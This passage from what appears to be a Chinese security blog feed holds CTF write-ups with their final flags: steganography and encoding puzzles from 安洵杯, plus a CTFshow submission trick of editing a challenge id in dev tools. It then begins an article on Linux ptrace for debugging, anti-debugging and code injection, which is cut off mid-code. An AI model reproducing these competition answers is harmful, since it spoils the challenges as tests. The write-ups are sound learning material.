src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/980189465.png"></p><p>挂载得到一个flagbox和一个key.txt提示</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1164358016.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/640140118.png"></p><blockquote><p>key:a_cool_key<br>use Veracrypt</p></blockquote><p>于是乎用<a href="https://pan.baidu.com/s/1fxkBdoVQj3jDw4hWVv-Wxw">Veracrypt</a>（提取码：0h1b）挂载flagbox得到flag.txt，but它却是个假flag</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3343605263.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1532584697.png"></p><p>卡住了~待续…</p><h2 id="开始抑郁"><a href="#开始抑郁" class="headerlink" title="开始抑郁"></a>开始抑郁</h2><p><a href="https://pan.baidu.com/s/1K4yUH21QoTlpKSAOdtYgOA">附件</a>（提取码：4bco）</p><p>一言不合上来就是binwalk，分离出一加密的压缩包以及打不开的图片（直接改图片后缀为zip<br>接着010打开图片发现文件头有问题，修改一下</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3680280649.png"></p><p>回头看是个二维码，扫码得到如下：</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/537832568.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">++++++++[&gt;&gt;++&gt;++++&gt;++++++&gt;++++++++&gt;++++++++++&gt;++++++++++++&gt;++++++++++++++&gt;++++++++++++++++&gt;++++++++++++++++++&gt;++++++++++++++++++++&gt;++++++++++++++++++++++&gt;++++++++++++++++++++++++&gt;++++++++++++++++++++++++++&gt;++++++++++++++++++++++++++++&gt;++++++++++++++++++++++++++++++&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;&gt;&gt;&gt;-----.&lt;&lt;&lt;&lt;+.&gt;-----.&gt;&gt;&gt;.++.&lt;&lt;&lt;.&lt;.&gt;.&gt;&gt;&gt;--.++..&lt;&lt;&lt;.&gt;&gt;&gt;--.&lt;&lt;&lt;.&gt;&gt;&gt;.++..&lt;&lt;&lt;.&gt;&gt;&gt;--.&lt;&lt;&lt;&lt;.&gt;.&gt;&gt;&gt;.++.&lt;&lt;&lt;.&lt;.&gt;.&gt;&gt;&gt;--.++..&lt;&lt;&lt;.&gt;&gt;&gt;--.&lt;&lt;&lt;.&gt;&gt;&gt;.++..&lt;&lt;&lt;.&gt;&gt;&gt;--.&lt;&lt;&lt;.&gt;&gt;&gt;.++..&lt;&lt;&lt;.&gt;&gt;&gt;--.&lt;&lt;&lt;&lt;.&gt;.&gt;&gt;&gt;.++.&lt;&lt;&lt;.&lt;.&gt;.&gt;&gt;&gt;--.++.&lt;&lt;&lt;.&lt;.&gt;.&gt;&gt;&gt;--.++.&lt;&lt;&lt;.&lt;.&gt;.&gt;&gt;&gt;--.++.&lt;&lt;&lt;.&lt;.&gt;.&gt;&gt;&gt;--.++.&lt;&lt;&lt;.&lt;.&gt;.&gt;&gt;&gt;--.++.&lt;&lt;&lt;.&lt;.&gt;.&gt;&gt;&gt;--.++.&lt;&lt;&lt;.&lt;.&gt;.&gt;&gt;&gt;--.++..&lt;&lt;&lt;.&gt;&gt;&gt;--.&lt;&lt;&lt;&lt;.&gt;.&gt;&gt;&gt;.++.&lt;&lt;&lt;.&lt;.&gt;.&gt;&gt;&gt;--.++..&lt;&lt;&lt;.&gt;&gt;&gt;--.&lt;&lt;&lt;&lt;.&gt;.&gt;&gt;&gt;.++.&lt;&lt;&lt;.&lt;.&gt;.&gt;&gt;&gt;--.++.&lt;&lt;&lt;.&lt;.&gt;.&gt;&gt;&gt;--.++.&lt;&lt;&lt;.&lt;.&gt;.&gt;&gt;&gt;--.++..&lt;&lt;&lt;.&gt;&gt;&gt;--.&lt;&lt;&lt;.&lt;.&gt;.&gt;&gt;&gt;.++..&lt;&lt;&lt;.&gt;&gt;&gt;--.&lt;&lt;&lt;&lt;.&gt;.&gt;&gt;&gt;.++.&lt;&lt;&lt;.&lt;.&gt;.&gt;&gt;&gt;--.++.&lt;&lt;&lt;.&lt;.&gt;.&gt;&gt;&gt;--.++.&lt;&lt;&lt;.&lt;.&gt;.&gt;&gt;&gt;--.++.&lt;&lt;&lt;.&lt;.&gt;.&gt;&gt;&gt;--.++..&lt;&lt;&lt;.&gt;&gt;&gt;--.&lt;&lt;&lt;&lt;.&gt;.&gt;&gt;&gt;.++.&lt;&lt;&lt;.&lt;.&gt;.&gt;&gt;&gt;--.++..&lt;&lt;&lt;.&gt;&gt;&gt;--.&lt;&lt;&lt;&lt;.&gt;.&gt;&gt;&gt;.++.&lt;&lt;&lt;.&lt;.&gt;.&gt;&gt;&gt;--.++.&lt;&lt;&lt;.&lt;.&gt;.&gt;&gt;&gt;--.++.&lt;&lt;&lt;.&lt;.&gt;.&gt;&gt;&gt;--.++.&lt;&lt;&lt;.&lt;.&gt;.&gt;&gt;&gt;--.++.&lt;&lt;&lt;.&lt;.&gt;.&gt;&gt;&gt;--.++.&lt;&lt;&lt;.&lt;.&gt;.&gt;&gt;&gt;--.++.&lt;&lt;&lt;.&lt;.&gt;.&gt;&gt;&gt;--.++..&lt;&lt;&lt;.&gt;&gt;&gt;--.&lt;&lt;&lt;.&gt;&gt;&gt;.++..&lt;&lt;&lt;.&gt;&gt;&gt;--.&lt;&lt;&lt;.&gt;&gt;&gt;.++..</span><br></pre></td></tr></table></figure><p>解密一下：<a href="http://ctf.ssleye.com/brain.html">brainfuck</a> -&gt; <a href="http://ctf.ssleye.com/jsfuck.html">jsfuck</a>，得到压缩包密码：20200824152800（bushi；接着转波<a href="https://www.beijing-time.org/shijianchuo/">时间戳</a>得到压缩包密码：1598254080；得到如下一张图</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3443620349.png"></p><p>不难看出是《福尔摩斯探案集》里跳舞的小人，对照解密得到：WATCHTHEVIDEO</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/5293066.png"></p><p>watch the video? 视频在哪~ 于是乎binwalk下这张图得到：</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3906753525.png"></p><p>将flag.png放到010修复一下得到：</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/234230153.png"></p><p>接着用TweakPNG校验发现数据块异常</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3751799558.png"></p><p>然后修改高度，查看图片发现了flag格式</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2456199894.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1412817610.png"></p><p>这时可以知道flag就是在那六张图片里面的信息，先打开你的名字那个B站链接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.bilibili.com&#x2F;bangumi&#x2F;play&#x2F;ep118250</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/800838382.png"></p><p>然后根据球号找到对应位置（6：12、21：05、22：24、44：52、93：25）得到：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1200</span><br><span class="line">2016</span><br><span class="line">GRANDMENU</span><br><span class="line">RCHITECTURE</span><br><span class="line">1335</span><br><span class="line">整合得到flag：flag&#123;1200-2016-GRANDMENU-RCHITECTURE-1335&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2116052045.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3082374543.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2954252164.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/862170533.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3190111931.png"></p><h2 id="yang"><a href="#yang" class="headerlink" title="yang"></a>yang</h2><p><a href="https://pan.baidu.com/s/1OD1-9BbiSfcjDAEBi0-FmQ">附件</a>（提取码：omzg）</p><p>属性查看得到：i-soon chengli time，一查得知安洵的成立时间为20150331</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1472045686.png"></p><p>MP3Stego隐写得到：</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1828343654.png"></p><p>接着与佛论禅解得是个zip</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3892872245.png"></p><p>010得到一个加密的包</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/4114469183.png"></p><p>从注解中发现应该是Morse码</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/564220448.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">..-. .-.. .- --. .. -....- ... --- --- -. -....- -.... .-</span><br></pre></td></tr></table></figure><p>Morse解码得到flag：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag i-soon-6a</span><br></pre></td></tr></table></figure><h2 id="一封情书"><a href="#一封情书" class="headerlink" title="一封情书"></a>一封情书</h2><p><a href="https://pan.baidu.com/s/1De-qQi-ZAA23QelmU_gRVA">附件</a>（提取码：0klp）</p><p>打开情书发现是9409=97x97的二值图像的值，脚本整不来，这里我用的是Y5neKo师傅整的<a href="https://tool.ysneko.com/bin_QR/">开源项目</a>（PS：白嫖怪也必须安排上<a href="https://tools.harvey.plus/">Harvey在线工具</a>）</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2873727401.png"></p><p>扫码得到：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">OTctMyAxLTMgMS0zIDMtMiAzLTIgMy0yIDEtMiAxLTUgMS0yIDEtMyAzLTIgOTctMyAzLTIgOTQtMSAxLTUgNC0yIDQtMiA0LTIgNC0yIDk3LTMgMS0zIDMtMiA0LTIgMS01IDMtMiA0LTIgMy0yIDMtMiAzLTIgNC0yIDk3LTMgMy0yIDEtNSAxLTUgMy0yIDEtMyA0LTIgNC0yIDEtMiAzLTIgMS0zIDQtMiA0LTIgNC0yIDMtMiA5NC0xIDEtMyAxLTMgMS0zIDMtMiA\zLTIgMS0zIDk0LTEgMS0zIDk0LTEgNC0yIDMtMiAxLTIgOTctMyA5Ny0zIDEtMw&#x3D;</span><br></pre></td></tr></table></figure><p>Base64解得：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">97-3 1-3 1-3 3-2 3-2 3-2 1-2 1-5 1-2 1-3 3-2 97-3 3-2 94-1 1-5 4-2 4-2 4-2 4-2 97-3 1-3 3-2 4-2 1-5 3-2 4-2 3-2 3-2 3-2 4-2 97-3 3-2 1-5 1-5 3-2 1-3 4-2 4-2 1-2 3-2 1-3 4-2 4-2 4-2 3-2 94-1 1-3 1-3 1-3 3-2 3-2 1-3 94-1 1-3 94-1 4-2 3-2 1-2 97-3 97-3 1-3</span><br></pre></td></tr></table></figure><p>接着根据以上坐标提取二维码上的色块值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1110001111010110000110010000001011010010100001111001111001111</span><br></pre></td></tr></table></figure><p>最后<a href="https://www.sojson.com/hexconvert.html">二进制转36进制</a>得到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flagj5w2a0ow</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安洵杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFshow-群友挑战</title>
      <link href="2021/03/05/CTFshow-%E7%BE%A4%E5%8F%8B%E6%8C%91%E6%88%98/"/>
      <url>2021/03/05/CTFshow-%E7%BE%A4%E5%8F%8B%E6%8C%91%E6%88%98/</url>
      
        <content type="html"><![CDATA[<h2 id="CTFshow福利抽奖"><a href="#CTFshow福利抽奖" class="headerlink" title="CTFshow福利抽奖"></a>CTFshow福利抽奖</h2><p>打开容器一看竟是白给flag，结果返回一看，好家伙，提交框没了~<br>于是乎偷梁换柱，打开隔壁老王家的大门，f12将id改成抽奖题的id即可成功提交flag</p><p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/74258207.png"></p><p>分子竟不是我自己.gif</p><p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/2445478444.png"></p><p>待续…</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctfshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux-沙盒入门，ptrace从0到1</title>
      <link href="2021/03/04/linux-%E6%B2%99%E7%9B%92%E5%85%A5%E9%97%A8%EF%BC%8Cptrace%E4%BB%8E0%E5%88%B01/"/>
      <url>2021/03/04/linux-%E6%B2%99%E7%9B%92%E5%85%A5%E9%97%A8%EF%BC%8Cptrace%E4%BB%8E0%E5%88%B01/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文是在linux系统角度下，对ptrace反调试进行底层分析，使我们更清楚的看到一些底层原理的实现，更好的理解在逆向工程中的一些突破口，病毒怎么实现代码注入，本文还将列出一些常见的攻防手段，分析其原理，让我们一同见证见证茅与盾激情对决！</p><h2 id="什么是ptrace？"><a href="#什么是ptrace？" class="headerlink" title="什么是ptrace？"></a>什么是ptrace？</h2><p>如果了解过逆向工程的小伙伴，肯定对这个ptrace不陌生，因为这是反调试技术中的基础入门手段，虽然现在诸如代码虚拟化之类的其他防逆向技术已经很成熟了，但是ptrace仍然是一些商业软件产品中使用，也是我们入门反调试所必须的基础技术！</p><p>ptrace在linux 反调试技术中的地位就如同nc在安全界的地位，瑞士军刀啊!</p><p>ptrace使用场景：</p><ol><li>编写动态分析工具，如gdb,strace</li><li>反追踪，一个进程只能被一个进程追踪(<em>注：一个进程能同时追踪多个进程</em>)，若此进程已被追踪，其他基于ptrace的追踪器将无法再追踪此进程，更进一步可以实现子母进程双线执行动态解密代码等更高级的反分析技术</li><li>代码注入，往其他进程里注入代码。</li><li>不退出进程，进行在线升级。</li></ol><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>Ptrace 可以让父进程控制子进程运行，并可以检查和改变子进程的核心image的功能（Peek and poke 在系统编程中是很知名的叫法，指的是直接读写内存内容）。ptrace主要跟踪的是进程运行时的状态，直到收到一个终止信号结束进程，这里的信号如果是我们给程序设置的断点，则进程被中止，并且通知其父进程，在进程中止的状态下，进程的内存空间可以被读写。当然父进程还可以使子进程继续执行，并选择是否忽略引起中止的信号，ptrace可以让一个进程监视和控制另一个进程的执行,并且修改被监视进程的内存、寄存器等,主要应用于断点调试和系统调用跟踪，strace和gdb工具就是基于ptrace编写的！</p><p>ptrace()其实是linux的一种系统调用，所以当我们用gdb进行attach其他进程的时候，需要root权限。</p><h3 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h3><p>在Linux系统中，进程状态除了我们所熟知的TASK_RUNNING，TASK_INTERRUPTIBLE，TASK_STOPPED等，还有一个TASK_TRACED，而TASK_TRACED将调试程序断点成为可能。</p><ol><li><strong>R (TASK_RUNNING)，可执行状态。</strong></li><li><strong>S (TASK_INTERRUPTIBLE)，可中断的睡眠状态。</strong></li><li><strong>D (TASK_UNINTERRUPTIBLE)，不可中断的睡眠状态。</strong></li><li><strong>T (TASK_STOPPED or TASK_TRACED)，暂停状态或跟踪状态。</strong></li></ol><p>当使用了ptrace跟踪后，所有发送给被跟踪的子进程的信号(除了SIGKILL)，都会被转发给父进程，而子进程则会被阻塞，这时子进程的状态就会被系统标注为TASK_TRACED，而父进程收到信号后，就可以对停止下来的子进程进行检查和修改，然后让子进程继续运行。</p><p><strong>那么什么是进程信号？</strong></p><p>一个信号就是一条小消息，它通知进程系统中发生了一个某种类型的事件，信号是多种多样的，并且一个信号对应一个事件，这样才能做到当进程收到一个信号后，知道到底是一个什么事件，应该如何处理（但是要保证必须识别这个信号），个人理解信号就是操作系统跟进程沟通的一个有特殊含义的语句吧</p><p>我们可以直接通过kill  -l  来查看信息的种类</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/135454966.png"></p><p>一共62种，其中1<del>31是非可靠信号，34</del>64是可靠信号(非可靠信号是早期Unix系统中的信号，后来又添加了可靠信号方便用户自定义信号，这二者之间具体的区别在下文中会提到)</p><h3 id="ptrace函数的定义"><a href="#ptrace函数的定义" class="headerlink" title="ptrace函数的定义"></a>ptrace函数的定义</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;sys&#x2F;ptrace.h&gt;       </span><br><span class="line">long ptrace(enum __ptrace_request request, pid_t pid, void *addr, void *data);</span><br></pre></td></tr></table></figure><p>一共有四个参数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">- &#96;request&#96;: 表示要执行的操作类型。&#x2F;&#x2F;反调试会用到&#96;PT_DENY_ATTACH&#96;，调试会用到&#96;PTRACE_ATTACH&#96;</span><br><span class="line"></span><br><span class="line">- &#96;pid&#96;: 要操作的目标进程ID</span><br><span class="line"></span><br><span class="line">- &#96;addr&#96;: 要监控的目标内存地址</span><br><span class="line"></span><br><span class="line">- &#96;data&#96;: 保存读取出或者要写入的数据</span><br></pre></td></tr></table></figure><p>详情请参看man手册</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;man7.org&#x2F;linux&#x2F;man-pages&#x2F;man2&#x2F;ptrace.2.html</span><br></pre></td></tr></table></figure><h3 id="ptrace函数的内核实现"><a href="#ptrace函数的内核实现" class="headerlink" title="ptrace函数的内核实现"></a>ptrace函数的内核实现</h3><p>ptrace的内核实现在<code>kernel/ptrace.c</code>文件中，直接看内核接口是SYSCALL_DEFINE4(ptrace, long, request, long, pid, unsigned long, addr, unsigned long, data)，代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE4(ptrace, long, request, long, pid, unsigned long, addr,unsigned long, data)</span><br><span class="line">&#123;</span><br><span class="line">        struct task_struct *child;</span><br><span class="line">        long ret;</span><br><span class="line">       </span><br><span class="line">        if (request &#x3D;&#x3D; PTRACE_TRACEME)</span><br><span class="line">        &#123;</span><br><span class="line">            ret &#x3D; ptrace_traceme();</span><br><span class="line">            if (!ret)</span><br><span class="line">                arch_ptrace_attach(current);</span><br><span class="line">                goto out;</span><br><span class="line">        &#125;</span><br><span class="line">       </span><br><span class="line">        child &#x3D; ptrace_get_task_struct(pid);</span><br><span class="line">        if (IS_ERR(child))</span><br><span class="line">        &#123;</span><br><span class="line">            ret &#x3D; PTR_ERR(child);</span><br><span class="line">            goto out;</span><br><span class="line">        &#125;</span><br><span class="line">       </span><br><span class="line">        if (request &#x3D;&#x3D; PTRACE_ATTACH || request &#x3D;&#x3D; PTRACE_SEIZE) &#123;</span><br><span class="line">            ret &#x3D; ptrace_attach(child, request, addr, data);</span><br><span class="line">            &#x2F;*</span><br><span class="line">             * Some architectures need to do book-keeping after</span><br><span class="line">             * a ptrace attach.</span><br><span class="line">             *&#x2F;</span><br><span class="line">            if (!ret)</span><br><span class="line">                arch_ptrace_attach(child);</span><br><span class="line">            goto out_put_task_struct;</span><br><span class="line">        &#125;</span><br><span class="line">       </span><br><span class="line">        ret &#x3D; ptrace_check_attach(child, request &#x3D;&#x3D; PTRACE_KILL ||request &#x3D;&#x3D; PTRACE_INTERRUPT);</span><br><span class="line">        if (ret &lt; 0)</span><br><span class="line">            goto out_put_task_struct;</span><br><span class="line">        ret &#x3D; arch_ptrace(child, request, addr, data);</span><br><span class="line">        if (ret || request !&#x3D; PTRACE_DETACH)</span><br><span class="line">            ptrace_unfreeze_traced(child);</span><br><span class="line">    </span><br><span class="line">         out_put_task_struct:</span><br><span class="line">            put_task_struct(child);</span><br><span class="line">         out:</span><br><span class="line">            return ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从中可以看到整个代码逻辑比较简单，其中对PTRACE_TRACEME和PTRACE_ATTACH 是做特殊处理的，其他的就是对cpu架构的相关的了。</p><h2 id="ptrace使用场景"><a href="#ptrace使用场景" class="headerlink" title="ptrace使用场景"></a>ptrace使用场景</h2><h3 id="1-调试："><a href="#1-调试：" class="headerlink" title="1.调试："></a>1.调试：</h3><p>因为进行一次逆向工程的时候，会对程序进行动态断点调试，来帮助我们跟进我们关注的切入点，因为要让人脑来进行推演一大长串汇编指令运行结果显然是不可能，所以我们就需要让机器来代替我们运算，我们只需要在合适的节点下断点，来观察。</p><p>而prtace既能用作调试，也能用作反调试，当传入的request不同时，就可以切换到不同的功能了</p><p><strong>原理</strong></p><p>当传入的request参数为PTRACE_ATTACH，就会起到调试功能</p><p>在使用<code>ptrace</code>之前需要在两个进程间建立追踪关系，其中trace可以不做任何事，也可使用<code>prctl</code>和<code>PTRACE_TRACEME</code>来进行设置，ptrace编程的主要部分是tracer，它可以通过附着的方式与tracee建立追踪关系，建立之后，可以控制tracee在特定的时候暂停并向tracer发送相应信号，而tracer则通过循环等待<code>waitpid</code>来处理tracee发来的信号，如下图所示:</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/494637309.png"></p><p><strong>建立追踪关系</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">在进行追踪前需要先建立追踪关系，相关request有如下4个：</span><br><span class="line">PTRACE_TRACEME：tracee表明自己想要被追踪，这会自动与父进程建立追踪关系，这也是唯一能被tracee使用的request，其他的request都由tracer指定。</span><br><span class="line">PTRACE_ATTACH：tracer用来附着一个进程tracee，以建立追踪关系，并向其发送SIGSTOP信号使其暂停。</span><br><span class="line">PTRACE_SEIZE：像PTRACE_ATTACH附着进程，但它不会让tracee暂停，addr参数须为0，data参数指定一位ptrace选项。</span><br><span class="line">PTRACE_DETACH：解除追踪关系，tracee将继续运行。</span><br></pre></td></tr></table></figure><p>其中建立关系时，tracer使用如下方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ptrace(PTRACE_ATTACH, pid, 0, 0);</span><br><span class="line">&#x2F;*或*&#x2F;</span><br><span class="line">ptrace(PTRACE_SEIZE, pid, 0, PTRACE_O_flags); &#x2F;*指定追踪选项立即生效*&#x2F;</span><br></pre></td></tr></table></figure><p>因为我们的栗子会用到execl（）系统调用，在此之前我有必要补充一下系统调用这个概念：</p><p><strong>系统调用</strong></p><p>为了让运行在用户态的程序能访问计算机系统的各种硬件资源，又因为硬件资源有限，而在现代多任务操作系统上同时运行的多个进程都需要访问这些资源，所以为了更好的管理这些资源，所有对这些资源的访问都必须受操作系统控制。而程序访问这些资源，就必须通过系统调用来告诉操作系统我需要访问哪些资源。</p><p>在linux中，系统调用是用户态访问内核态的唯一合法方式，除异常和陷入外。</p><p>在linux内核中设置了一组用于实现系统功能的子程序，称为系统调用。系统调用和普通库函数调用非常相似，只是系统调用由操作系统核心提供，运行于<strong>内核态</strong>，而普通的函数调用由函数库或用户自己提供，运行于<strong>用户态</strong>。一般的，进程是不能访问内核的，它不能访问内核所占内存空间也不能调用内核函数，这是由于cpu保护机制所决定的。</p><p>应用程序调用内核函数基本原理：应用程序需要通过应用编程接口（api）来实现访问硬件资源功能，而api接口是通过里面封装的系统调用，去调用能实现访问硬件资源功能的相应的内核子程序，关系如下。</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3406173869.png"></p><p>一个api功能可能需要很多个系统调用来共同实现，有时候一个api功能实现，也有可能根本不需要用到系统调用，这里把api和系统调用混为一谈。</p><p>层层递进，来实现用户态到内核态的转换，系统调用好比一个协调者，来沟通运行在用户态的应用程序和运行在内核态的程序的交互，也就是说，内核只是和系统调用打交道；而我们程序员只需要和相应的api打交道就行，而不用去关心底层的具体系统调用怎么实现，因为api已经把一切细节都封装好了。</p><p>在linux下，系统调用是通过0x80实现的，Linux下有319个系统调用，我们来看看系统调用的具体细节：</p><p>实际上，Linux中每个系统调用都有相应的系统调用号作为唯一的标识，内核维护一张系统调用表，sys_call_table，表中的元素是系统调用函数的起始地址，而系统调用号就是系统调用在调用表的偏移量，也就是说我们通过系统调用号来调用相应的系统调用，在x86上，系统调用号是通过eax寄存器传递给内核的。比如fork（）的实现。</p><p>当然就算是这样，我们运行在用户态的应用程序也无法直接执行内核代码，也不能直接调用内核空间中的函数，因为内核驻留在受保护的地址空间上。所有我们需要一个机制，这个机制就是软中断，首先，用户程序为系统调用设置参数，其中一个参数是系统调用编号，参数设置完成后，程序执行“系统调用”指令，通过软中断切换到内核态执行内核代码。</p><p>在x86系统上的软中断由int产生。这个指令会导致一个异常：产生一个事件，这个事件会致使处理器切换到内核态并跳转到一个新的地址，并开始执行那里的异常处理程序，此时的异常处理程序实际上就是系统调用处理程序，它与硬件体系结构紧密相关，新地址的指令会保存程序的状态以便恢复到用户程序状态，计算出应该调用哪个系统调用，调用内核中实现那个系统调用的函数，恢复用户程序状态，然后将控制权返还给用户程序。</p><blockquote><p>假设用name表示系统调用的名称，那么系统调用号与系统调用响应函数的关系是：以系统调用号<code>_NR_name</code>作为下标，可找出系统调用表<code>sys_call_table</code>(见<code>arch/i386/kernel/entry.S</code>)中对应表项的内容，它正好是该系统调用的响应函数<code>sys_name</code>的入口地址。</p></blockquote><p><code>execl()</code>函数对应的系统调用为<code>__NR_execve</code>，系统调用值为59。</p><p>我们来仔细看看库函数execve调用链：</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/834272689.png"></p><p>ptrace调试示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;sys&#x2F;wait.h&gt;&#x2F;*引入wait函数的头文件*&#x2F;</span><br><span class="line">#include&lt;sys&#x2F;reg.h&gt;&#x2F;* 对寄存器的常量值进行定义，如Eax，EBX....... *&#x2F;</span><br><span class="line">#include&lt;sys&#x2F;user.h&gt;&#x2F;*gdb调试专用文件，里面有定义好的各种数据类型*&#x2F;</span><br><span class="line">#include&lt;sys&#x2F;ptrace.h&gt;&#x2F;*引入prtace头文件*&#x2F;</span><br><span 